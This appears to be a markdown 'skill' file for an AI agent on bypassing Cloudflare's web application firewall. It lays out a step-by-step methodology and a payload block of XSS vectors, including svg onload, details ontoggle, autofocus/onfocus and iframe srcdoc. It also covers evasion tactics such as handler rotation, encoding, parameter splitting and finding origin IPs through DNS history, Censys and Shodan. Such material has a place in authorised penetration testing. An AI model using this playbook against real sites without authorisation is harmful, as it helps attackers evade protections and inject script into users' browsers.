---
name: waf-bypass-cloudflare
description: Skill for bypassing Cloudflare WAF using specific XSS payloads, event handler techniques, and known bypass patterns. Built from the Awesome-WAF knowledge base.
sources: github
report_count: 15
---

# Cloudflare WAF Bypass

## Crown Jewel Targets

- Endpoints behind Cloudflare with relaxed security settings
- Pages where Cloudflare "Under Attack" mode is disabled
- API endpoints that bypass Cloudflare cache
- Origin servers discoverable via DNS history

## Attack Surface Signals

- Cloudflare blocks standard `<script>` payloads
- Cloudflare allows SVG and certain HTML5 elements
- Event handlers with `autofocus` often bypass
- `cf-ray` header confirms Cloudflare presence

## Step-by-Step Methodology

1. Confirm Cloudflare presence: check for `cf-ray` header or `__cfuid` cookie
2. Test basic XSS: `<script>alert(1)</script>` - expect block
3. Test SVG with onload: `<svg onload=alert(1)>`
4. Test HTML5 event handlers:
   - `<details open ontoggle=alert(1)>`
   - `<body onload=alert(1)>`
   - `<input autofocus onfocus=alert(1)>`
   - `<select autofocus onfocus=alert(1)>`
   - `<textarea autofocus onfocus=alert(1)>`
   - `<keygen autofocus onfocus=alert(1)>`
5. Test iframe with srcdoc: `<iframe srcdoc="<img src=x onerror=alert(1)>">`
6. Test HTML encoding variations
7. If all blocked, try DNS history to find origin IP

## Payloads

```html
<!-- SVG-based - often works -->
<svg onload=alert(1)>

<!-- Details/toggle - bypasses most Cloudflare rules -->
<details open ontoggle=alert(1)>

<!-- Autofocus variants -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>

<!-- Iframe srcdoc -->
<iframe srcdoc="<img src=x onerror=alert(1)>">
```

## Common Root Causes

- Cloudflare WAF rules focus on common XSS vectors
- HTML5-specific elements and attributes have weaker coverage
- Event handlers with `autofocus` trigger without user interaction
- Cloudflare's WAF can be bypassed by finding origin IP via DNS history

## Bypass Techniques

- Event handler rotation: onload -> onfocus -> ontoggle -> onwheel
- Origin IP discovery: DNS history, Censys, Shodan
- Encoding: URL, Unicode, mixed encoding
- HPP splitting across parameters

## Gate 0 Validation

- [ ] Have I confirmed Cloudflare WAF presence?
- [ ] Have I tried all HTML5 event handler payloads?
- [ ] Have I attempted origin IP discovery?
